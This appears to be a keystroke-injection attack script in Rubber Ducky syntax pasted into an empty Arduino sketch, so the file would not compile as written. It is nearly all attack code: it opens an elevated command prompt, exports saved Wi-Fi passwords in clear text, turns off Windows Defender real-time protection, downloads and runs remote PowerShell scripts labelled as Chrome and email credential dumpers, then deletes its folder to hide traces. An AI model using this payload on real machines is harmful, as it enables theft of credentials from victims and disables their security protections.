void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
DELAY 1000
GUI r
DELAY 300
STRING cmd 
DELAY 350
CTRL-SHIFT ENTER
DELAY 1000
ALT y 
DELAY 500
STRING cd C:\
ENTER
DELAY 100
STRING md l 
ENTER
DELAY 100
STRING cd l && netsh wlan export profile key=clear >nul
ENTER
DELAY 1000
STRING powershell
ENTER
DELAY 300
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 1500
STRING set-executionpolicy unrestricted
ENTER
DELAY 500
STRING IEX (New-Object Net.WebClient).DownloadString('Location of chrome dump .ps1')
ENTER
DELAY 2000
STRING IEX (New-Object Net.WebClient).DownloadString('location of email .ps1')
ENTER
DELAY 1500
STRING exit
ENTER
DELAY 250
STRING cd ..
ENTER 
DELAY 150
STRING del "C:\l"
ENTER
DELAY 150
STRING y
ENTER
DELAY 200
STRING rmdir "C:\l"
DELAY 150
STRING exit
ENTER
}
